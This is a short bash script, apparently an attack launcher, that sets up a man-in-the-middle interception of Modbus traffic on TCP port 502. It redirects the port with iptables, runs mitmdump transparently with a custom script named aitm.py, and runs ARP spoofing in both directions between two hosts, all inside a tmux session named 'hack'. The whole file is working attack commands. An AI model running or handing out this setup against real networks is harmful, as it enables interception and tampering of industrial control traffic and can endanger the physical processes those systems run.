#!/bin/bash

tmux new-session -d -s hack
tmux send 'iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 502 -j REDIRECT --to-port 9090' ENTER
tmux send 'mitmdump -p 9090 -m transparent -s /root/aitm.py --set global_block=false' ENTER
tmux split-window -h
tmux send 'arpspoof -t 1.1.1.21 1.1.1.254' ENTER
tmux split-window
tmux send 'arpspoof -t 1.1.1.254 1.1.1.21' ENTER

tmux attach
